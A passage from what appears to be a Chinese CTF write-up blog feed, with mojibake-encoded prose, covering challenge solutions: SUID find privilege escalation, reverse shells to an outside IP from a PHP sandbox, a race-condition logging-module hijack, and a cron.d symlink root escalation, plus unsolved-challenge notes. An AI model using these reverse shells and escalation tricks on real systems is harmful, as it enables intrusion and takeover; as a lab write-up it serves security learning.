punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$valid_username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span>    <span class="token variable">$valid_password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'qwe123!@#'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">===</span> <span class="token variable">$valid_username</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">===</span> <span class="token variable">$valid_password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'loggedin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: admin.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script>alert("Invalid username or password.");window.location.href="index.html";&lt;/script>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿ç€è¿™ä¸ªè´¦å¯†ç™»å½•ï¼Œæ²¡å•¥ç”¨</p><p>é‚£å°±å›æ¥ææƒ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥findææƒ</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817165701220.png" alt="image-20240817165701220"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/sh <span class="token parameter variable">-pc</span> <span class="token string">"cat /flag"</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817165850641.png" alt="image-20240817165850641"></p><hr><h1 id="php-onlineï¼ˆå¤ç°ï¼‰"><a href="#php-onlineï¼ˆå¤ç°ï¼‰" class="headerlink" title="php_onlineï¼ˆå¤ç°ï¼‰"></a>php_onlineï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> render_template<span class="token keyword">import</span> os<span class="token keyword">import</span> secretsapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>working_id <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">id</span><span class="token punctuation">.</span>isalnum<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'æ— æ•ˆçš„ID'</span>        session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">id</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'mkdir /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; chown www-data /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; chmod a+w /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">id</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'submit_id.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/sandbox'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'submit_code.html'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'id'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'no id'</span>        user_id <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> user_id <span class="token keyword">in</span> working_id<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'task is still running'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            working_id<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>            code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; rm *'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'sudo -u www-data cp /app/init.py /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">/init.py &amp;&amp; cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; sudo -u www-data python3 init.py'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'rm -rf /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">/phpcode'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                        php_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">/phpcode'</span></span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>            php_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>            php_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            result <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; sudo -u nobody php phpcode'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; rm *'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            working_id<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>            <span class="token keyword">return</span> result<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®¡è®¡æµ‹è¯•å‘ç°æ˜¯ä¸€ä¸ªæ‰§è¡Œä»»æ„phpä»£ç çš„æ²™ç›’ç¯å¢ƒ</p><p>ç›´æ¥çœ‹åˆ°æ‰§è¡Œphpä»£ç çš„å‘½ä»¤è¿™é‡Œï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; sudo -u nobody php phpcode'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»¥ä¸€ä¸ªä½æƒé™æ‰§è¡Œphpæ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™æƒ³åˆ°èƒ½ä¸èƒ½å¯¹ user_id å‘½ä»¤æ³¨å…¥ï¼Œä½†æ˜¯å‰é¢æœ‰é™åˆ¶ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">id</span><span class="token punctuation">.</span>isalnum<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'æ— æ•ˆçš„ID'</span>session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥ä¸å¯èƒ½ç›´æ¥æ”¹idæ¥æ³¨å…¥ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿæ³¨æ„åˆ°è¿™é‡Œæ˜¯ç”¨ session å­˜ user_id çš„ï¼Œè€Œ key æ˜¯<code>secrets.token_hex(16)</code></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯æ˜¯sessionä¼ªé€ ï¼Œæƒ³åŠæ³•è·å–keyï¼Œç›´æ¥ç”¨phpå†™pyæ–‡ä»¶å¯¼å…¥index.pyæ¥è·å–key</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo "import sys\nsys.path.append(\"/app\")\nimport index\nprint(index.app.secret_key)">2.py &amp;&amp; python3 2.py'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°keyï¼š<code>09497afbba5c8dbca6c05b313f712cdf</code>ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªkeyæ¯æ¬¡æ‰§è¡Œéƒ½ä¼šå˜ï¼Œå› ä¸ºæ˜¯<code>secrets.token_hex(16)</code></p><p>çœ‹æ¥sessionä¼ªé€ ä¹Ÿè¡Œä¸é€šï¼Œæ€»ä¹‹å…ˆå¼¹ä¸ªshell</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'bash -c \'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1\''</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„åˆ°æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸ªæ„ä¹‰ä¸æ˜çš„init.py</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817170906669.png" alt="image-20240817170906669"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> logginglogger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'Code execution start'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸€ä¸‹å“ªæ¥çš„</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'sudo -u www-data cp /app/init.py /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">/init.py &amp;&amp; cd /sandbox/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string"> &amp;&amp; sudo -u www-data python3 init.py'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»appä¸‹cpæ¥çš„ï¼Œä¼šä»¥ www-data çš„æƒé™è¿è¡Œä¸€æ¬¡init.py</p><p>é‚£ä¹ˆåªè¦æˆ‘ä»¬èƒ½å¤Ÿåœ¨ç”¨æˆ· AAAAAAAA è¿™é‡ŒåŠ«æŒç”¨æˆ· BBBBBBBB çš„ logging åº“ï¼Œå†™å…¥å¼¹shellçš„å‘½ä»¤ï¼Œç„¶åé€šè¿‡å’Œ BBBBBBBB æ‰§è¡Œphpæ—¶çš„<code>rm *</code>ç«äº‰å°±èƒ½è®©ä¸Šé¢è¿™ä¸ªè¯­å¥æ‰§è¡Œ www-data æƒé™çš„å¼¹shell</p><p>é‚£ä¹ˆå…ˆå‡†å¤‡ä¸¤ä¸ªuserï¼Œç„¶ååœ¨ AAAAAAAA çš„shellè¿™é‡Œå†™å…¥ logging.py </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">echo <span class="token operator">-</span>e <span class="token string">"import os,sys;os.system('bash -c \'bash -i >&amp; /dev/tcp/115.236.153.177/12944 &lt;&amp;1\'')"</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>bbbbbbbb<span class="token operator">/</span>logging<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥åœ¨ BBBBBBBB é‚£é‡Œé‡å¤å‘åŒ…æ‰§è¡Œ<code>python3 init.py</code>è¿›è¡Œæ¡ä»¶ç«äº‰</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817231655200.png" alt="image-20240817231655200"></p><p>æœ€ç»ˆæˆåŠŸå¼¹åˆ° www-data çš„shell</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817231732722.png" alt="image-20240817231732722"></p><p>æ¥ä¸‹æ¥è¦ærootæƒé™</p><p>è¿™é‡Œä½¿ç”¨è®¡åˆ’ä»»åŠ¡<code>/etc/cron.d</code>ï¼Œ<code>ln -s</code>å»ºç«‹ user_id åˆ°è®¡åˆ’ä»»åŠ¡çš„è½¯é“¾æ¥ï¼Œè¿™æ ·å­phpcodeçš„å†…å®¹å°±æˆè®¡åˆ’ä»»åŠ¡äº†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /etc/cron.d /sandbox/cccccccc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ¥åˆ° cccccccc ç”¨æˆ·è¿™é‡Œï¼Œåœ¨phpçš„ä»£ç æ¡†é‡Œè¾“å…¥æˆ‘ä»¬è®¾ç½®çš„è®¡åˆ’ä»»åŠ¡ï¼Œå› ä¸ºè®¡åˆ’ä»»åŠ¡æ¯åˆ†é’Ÿæ›´æ–°ä¸€æ¬¡æ‰€ä»¥æˆ‘ä»¬è®©phpè„šæœ¬å»¶è¿Ÿä¸€åˆ†é’Ÿå†è¢«åˆ æ‰</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">* * * * * root chmod 777 /flag#<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŠŠ &#x2F;flag è®¾ç½®ä¸ºå¯è¯»ï¼Œç­‰ä¸€åˆ†é’Ÿè¿‡åå°±å¯ä»¥äº†</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817235426122.png" alt="image-20240817235426122"></p><hr><h1 id="ä¼½ç›å®éªŒåœº-tpcms01ï¼ˆUnsolvedï¼‰"><a href="#ä¼½ç›å®éªŒåœº-tpcms01ï¼ˆUnsolvedï¼‰" class="headerlink" title="ä¼½ç›å®éªŒåœº_tpcms01ï¼ˆUnsolvedï¼‰"></a>ä¼½ç›å®éªŒåœº_tpcms01ï¼ˆUnsolvedï¼‰</h1><p>å¯¼å…¥æ•°æ®åº“ï¼Œæˆ‘ç”¨å°çš®èµ·çš„æ•°æ®åº“ç¯å¢ƒï¼Œéœ€è¦å…ˆæ³¨é‡Šæ‰sqlæ–‡ä»¶é‡Œç¬¬ä¸€è¡Œçš„åˆ›å»ºæ•°æ®åº“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-u</span> qwadmin <span class="token parameter variable">-p</span> qwadmin <span class="token operator">&lt;</span> db.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ•°æ®åº“é‡Œæ‹¿åˆ°æœ¬åœ°ç®¡ç†å‘˜çš„è´¦å·<code>admin</code>å’Œmd5åçš„å¯†ç <code>21232f297a57a5a743894a0e4a801fc3</code>ï¼ˆçˆ†å‡ºæ¥æ˜¯adminï¼‰</p><p>ä½†æ˜¯è¿œç¨‹è´¦å¯†ä¸å¯¹</p><p>æ²¡æ—¶é—´å®¡tp</p><hr><h1 id="bio-shareï¼ˆUnsolvedï¼‰"><a href="#bio-shareï¼ˆUnsolvedï¼‰" class="headerlink" title="bio_shareï¼ˆUnsolvedï¼‰"></a>bio_shareï¼ˆUnsolvedï¼‰</h1><blockquote><p>adminâ€™s bio is what u want, but admin will not share it to u.Login as test or test2, with the same password 123456a@b, Admin will visit this  application using <a href="http://www.test.com/">www.test.com</a></p></blockquote><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>    <span class="token directive"><span class="token keyword">listen</span> <span class="token number">80</span></span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">server_name</span> _</span><span class="token punctuation">;</span>    <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">root</span> /app/static</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">try_files</span> <span class="token variable">$uri</span> <span class="token variable">$uri</span>/ =404</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token directive"><span class="token keyword">location</span> /login/</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1:8000</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-Proto <span class="token variable">$scheme</span></span><span class="token punctuation">;</span><span class="token directive"><span class="token keyword">proxy_set_header</span> Origin http://127.0.0.1:8000</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token directive"><span class="token keyword">location</span> ~* ^/static/</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">return</span> <span class="token number">302</span> <span class="token variable">$scheme</span>://<span class="token variable">$http_host/forbidden.html?page=</span><span class="token variable">$uri</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token directive"><span class="token keyword">location</span> /api/</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1:8000</span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-Proto <span class="token variable">$scheme</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”¨ç»™çš„è´¦å¯†ç™»å½•ä¸Šå»ï¼Œçœ‹èµ·æ¥æ˜¯xss</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817155345585.png" alt="image-20240817155345585"></p><hr><h1 id="oldapiï¼ˆUnsolvedï¼‰"><a href="#oldapiï¼ˆUnsolvedï¼‰" class="headerlink" title="oldapiï¼ˆUnsolvedï¼‰"></a>oldapiï¼ˆUnsolvedï¼‰</h1><hr><h1 id="easy-javaï¼ˆUnsolvedï¼‰"><a href="#easy-javaï¼ˆUnsolvedï¼‰" class="headerlink" title="easy_javaï¼ˆUnsolvedï¼‰"></a>easy_javaï¼ˆUnsolvedï¼‰</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;webä¸“åœºï¼ˆx&lt;/p&gt;
&lt;p&gt;ææƒä¸“åœºï¼ˆâˆš&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="ææƒ" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="å†…å­˜é©¬" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Cè°ƒç”¨è¿‡ç¨‹åŸç†åŠå‡½æ•°æ ˆå¸§åˆ†æï¼ˆIntelï¼‰</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/10/C%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%8E%9F%E7%90%86%E5%8F%8A%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7%E5%88%86%E6%9E%90%EF%BC%88Intel%EF%BC%89/</id>
    <published>2024-08-10T10:03:51.000Z</published>
    <updated>2024-08-11T04:38:03.262Z</updated>
    
